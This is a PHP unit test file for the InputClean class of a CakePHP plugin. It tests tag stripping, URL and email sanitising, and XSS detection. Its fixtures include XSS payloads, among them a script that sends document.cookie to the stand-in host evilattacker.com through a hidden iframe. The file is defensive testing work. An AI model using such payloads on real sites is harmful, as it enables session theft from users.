<?php
/**
 * Unit Test for InputClean
 *
 * cake test In Lib/InputClean
 *
 * @package Input-CakePHP-Plugin
 * @link https://github.com/zeroasterisk/Input-CakePHP-Plugin
 */
App::uses('InputClean', 'Input.Lib');
App::uses('AppTestCase','Lib');

class InputCleanTest extends AppTestCase {

	public $fixtures = array();

	public function setUp() {
		parent::setUp();
		$this->InputClean = new InputClean;

		// all of these are potentially XSS attacks
		$this->xss = [
			0 => 'foobar<script>document.write(\'<iframe src="http://evilattacker.com?cookie=\'' . "\n" .
				' + document.cookie.escape() + \'" height=0 width=0 />\');</script>foobar',
			1 => 'foobar<a href="javascript:alert(1)">x</a>',
			2 => 'foobar<a href="#" style="danger">x</a>',
		];
	}

	public function tearDown() {
		parent::tearDown();
		unset($this->InputClean);
		ClassRegistry::flush();
	}

	public function testAllNoChanges() {
		$config = InputClean::configDefault();
		$v = [
			'abc' => 'abc',
			'Model' => [
				'name' => 'input cleaner',
				'email' => 'valid@example.com',
				'password' => '!@#$%^&*()',
				'url' => 'http://example.com/funky?something=1#anchor',
			]
		];
		$this->assertEqual(
			InputClean::all($v, $config),
			$v
		);
	}
	public function testAllChanges() {
		$config = InputClean::configDefault();
		$config['fields']['/.*\.html/'] = 'html';
		$config['fields']['/.*\.anything/'] = 'anything';
		$v = [
			'abc' => 'abc<a href="#htmlnotallowed">:(</a>',
			'html' => 'abc<a href="#htmlnotallowed">:(</a>',
			'anything' => 'abc<a href="#htmlnotallowed">:(</a>',
			'Model' => [
				'name' => 'input cleaner <strong>nohtml</strong>',
				'email' => 'valid@example.com#+subject=badcharfor' . "\n" . 'email',
				'password' => '!@#$%^&*()',
				'url' => 'http://example.com/funk'. "\n" . 'y?something=1#anchor',
				'html' => 'abc <a href="#html-allowed">:)</a>',
				'anything' => 'abc <a href="#html-allowed">:)</a>',
			]
		];
		$expect = [
			'abc' => 'abc:(',
			'html' => 'abc:(',
			'anything' => 'abc:(',
			'Model' => [
				'name' => 'input cleaner nohtml',
				'email' => 'valid@example.com#+subject=badcharforemail',
				'password' => '!@#$%^&*()',
				'url' => 'http://example.com/funky?something=1#anchor',
				'html' => 'abc <a href="#html-allowed">:)</a>',
				'anything' => 'abc <a href="#html-allowed">:)</a>',
			]
		];
		$this->assertEqual(
			InputClean::all($v, $config),
			$expect
		);
	}

	public function testFieldMatchDefault() {
		$pattern = '*';
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'basic')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.field')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.0.has_many')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, '')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, null)
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, false)
		);
		$this->assertFalse(
			InputClean::fieldMatch('', 'basic')
		);
	}

	public function testFieldMatchPregMatch() {
		$pattern = '/Model\..*field$/';
		$this->assertFalse(
			InputClean::fieldMatch($pattern, 'basic')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.field')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, 'Model.0.has_many')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.0.has_many_field')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, '')
		);

		$pattern = '/.*\.html/';
		$this->assertFalse(
			InputClean::fieldMatch($pattern, 'Model.0.has_many_html')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.0.html')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.0.html_withSuffix')
		);
	}

	public function testFieldMatchFnmatch() {
		$pattern = 'Model.*field';
		$this->assertFalse(
			InputClean::fieldMatch($pattern, 'basic')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.field')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, 'Model.0.has_many')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.0.has_many_field')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, '')
		);
	}

	public function testCleanField() {
		$config = InputClean::configDefault();
		$this->assertEqual(
			InputClean::cleanField('foo<strong>bar</strong> ' .
			'here', 'basic', $config),
			'foobar here'
		);
		// FILTER_SANITIZE_STRING (+ strip_tags)
		$this->assertEqual(
			InputClean::cleanField('foo<strong>bar</strong> ' .
			'here', 'Modle.basic', $config),
			'foobar here'
		);
		// FILTER_SANITIZE_URL
		// Remove all characters except letters, digits and
		// $-_.+!*'(),{}|\\^~[]`<>#%";/?:@&=.
		$this->assertEqual(
			InputClean::cleanField('http://exam'.
			"\n\r\t <>" . // << should be stripped
			'ple.com/path?query=1#anchor', 'Modle.url', $config),
			'http://example.com/path?query=1#anchor'
		);
		// FILTER_SANITIZE_EMAIL
		// Remove all characters except letters, digits and
		// !#$%&'*+-/=?^_`{|}~@.[].`
		$this->assertEqual(
			InputClean::cleanField('valid+target@exam'.
			"\n\r\t \"()<>" . // << should be stripped
			'ple.com?subject=funky', 'Modle.email', $config),
			'valid+target@example.com?subject=funky'
		);
	}

	public function testCleanAnything() {
	}
	public function testCleanBlacklist() {
		$config = InputClean::configDefault();
		$unchanged = [
			true, false, null, array(), $this, '', ' ',
			"foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar",
			"foobar > isolated GT allowed",
			"foobar &nbsp; entities allowed",
			htmlentities("foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar"),
			htmlentities('foobar <a href="#">escaped</a>')
		];
		foreach ($unchanged as $v) {
			$this->assertEqual(
				InputClean::clean($v, 'blacklist', $config),
				$v
			);
		}
	}

	public function testCleanString() {
		$config = InputClean::configDefault();
		$unchanged = [
			true, false, null, array(), $this, '', ' ',
			"foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar",
			"foobar > isolated GT allowed",
			"foobar &nbsp; entities allowed",
			htmlentities("foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar"),
			htmlentities('foobar <a href="#">escaped</a>')
		];
		foreach ($unchanged as $v) {
			$this->assertEqual(
				InputClean::clean($v, 'string', $config),
				$v
			);
		}

		$this->assertEqual(
			InputClean::clean("foobar < isolated LT not allowed (because of strip_tags)", 'string', $config),
			'foobar '
		);
		$this->assertEqual(
			InputClean::clean('foobar <a href="#" class="css" style="no xss">link</a> foobar', 'string', $config),
			'foobar link foobar'
		);
		$this->assertEqual(
			InputClean::clean('foobar <> no empty tag', 'string', $config),
			'foobar  no empty tag'
		);
		$this->assertEqual(
			InputClean::clean('foobar <!--e--> no comment tag', 'string', $config),
			'foobar  no comment tag'
		);
		$this->assertEqual(
			InputClean::clean('foobar <a href="#" no broken tag', 'string', $config),
			'foobar '
		);
		$this->assertEqual(
			InputClean::clean('foobar <!--e-- no broken comment tag', 'string', $config),
			'foobar '
		);

		// string XSS = always false (since HTML is stripped/sanitized)
		foreach ($this->xss as $i => $v) {
			// filter cleans string...  XSS doesn't find anything
			$r = InputClean::clean($v, 'string', $config);
			$this->assertFalse(empty($r));
		}
	}

	public function testCleanHtml() {
		$config = InputClean::configDefault();
		$unchanged = [
			true, false, null, array(), $this, '', ' ',
			"foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar",
			"foobar > isolated GT allowed",
			"foobar < isolated LT allowed",
			"foobar &nbsp; entities allowed",
			htmlentities("foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar"),
			htmlentities('foobar <a href="#">escaped</a>'),

			// HTML is allowed (but XSS will still throw exceptions)
			'foobar <a href="#" class="css">link</a> foobar',
			'foobar <> no empty tag',
			'foobar <!--e--> no comment tag',
			'foobar <a href="#" no broken tag',
			'foobar <!--e-- no broken comment tag',
		];
		foreach ($unchanged as $v) {
			$this->assertEqual(
				InputClean::clean($v, 'html', $config),
				$v
			);
		}

		// verify XSS
		foreach ($this->xss as $i => $v) {
			// verify XSS Exception
			try {
				$r = InputClean::clean($v, 'html', $config);
				$this->assertEqual($r, '', 'Should have thrown an UnsafeInputException');
			} catch (UnsafeInputException $e) {
				$this->assertEqual(
					$e->getMessage(),
					sprintf('Unsafe Input Detected [hash: %s]',
						md5($v)
					)
				);
			}
			// no filter...  XSS Exception
			try {
				$r = InputClean::clean($v, ['filter' => false, 'xss' => true]);
				$this->assertEqual($r, '', 'Should have thrown an UnsafeInputException');
			} catch (UnsafeInputException $e) {
				$this->assertEqual(
					$e->getMessage(),
					sprintf('Unsafe Input Detected [hash: %s]',
						md5($v)
					)
				);
			}

			// no filter...  XSS doesn't run
			$this->assertEqual(
				InputClean::clean($v, ['filter' => false, 'xss' => false]),
				$v
			);

			// filter cleans string...  XSS doesn't run
			$r = InputClean::clean($v, ['filter' => FILTER_SANITIZE_STRING, 'xss' => false]);
			$this->assertFalse(empty($r));

			// filter cleans string...  XSS doesn't find anything
			$r = InputClean::clean($v, ['filter' => FILTER_SANITIZE_STRING, 'xss' => true]);
			$this->assertFalse(empty($r));
		}
	}

	public function testConfig() {
	}

	public function testDetectXSS() {
		$v = 'foobar<script>document.write(\'<iframe src="http://evilattacker.com?cookie=\'' . "\n" .
		' + document.cookie.escape() + \'" height=0 width=0 />\');</script>foobar';
		$this->assertTrue(InputClean::detectXSS($v));

		$v = 'foobar <script>...foobar';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobar script...foobar';
		$this->assertFalse(InputClean::detectXSS($v));

		$v = 'foobar <a href="#" style="badstuff">foo</a>bar';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobar <a href="#" class="badstuff">foo</a>bar';
		$this->assertFalse(InputClean::detectXSS($v));

		// TODO: more tests to demonstrate functionality
	}

}
